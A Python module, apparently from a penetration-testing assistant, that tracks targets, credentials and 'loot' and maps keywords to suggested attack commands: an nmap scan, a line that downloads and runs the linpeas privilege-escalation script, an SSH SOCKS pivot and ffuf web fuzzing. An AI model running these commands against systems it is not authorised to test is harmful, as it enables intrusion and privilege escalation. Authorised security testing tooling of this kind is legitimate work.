"""
Engagement Management Module - Functions for managing security engagements
"""

import re
import os
from pathlib import Path

# Engagement memory
engagement_memory = {
    "targets": [],
    "credentials": [],
    "loot": [],
    "network_maps": [],
    "attack_history": []
}

def extract_targets(task):
    """Extract potential target IP addresses from user input"""
    global engagement_memory
    targets = re.findall(r'(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?', task)
    for t in targets:
        if t not in engagement_memory["targets"]:
            engagement_memory["targets"].append(t)
    return targets

def suggest_attack_plan(task):
    """Suggest an attack plan based on task description"""
    task_lower = task.lower()
    if "recon" in task_lower:
        return "Recommended: nmap -sC -sV -oA recon_scan <target> | tee recon_scan.txt | grep open"
    if "priv esc" in task_lower:
        return "Recommended: wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.txt"
    if "pivot" in task_lower:
        return "Recommended: ssh -D 9050 user@target -f -C -q -N (SOCKS Proxy Pivot)"
    if "web exploit" in task_lower:
        return "Recommended: ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    return ""

def record_finding(finding_type, value, source="manual"):
    """Record a finding in the engagement memory"""
    if finding_type == "target" and value not in engagement_memory["targets"]:
        engagement_memory["targets"].append(value)
        return True
    elif finding_type == "credential" and value not in engagement_memory["credentials"]:
        engagement_memory["credentials"].append(value)
        return True
    elif finding_type == "loot" and value not in engagement_memory["loot"]:
        engagement_memory["loot"].append(value)
        return True
    return False

def get_engagement_summary():
    """Get a summary of the current engagement"""
    return {
        "targets": len(engagement_memory["targets"]),
        "credentials": len(engagement_memory["credentials"]),
        "loot": len(engagement_memory["loot"]),
        "network_maps": len(engagement_memory["network_maps"])
    } 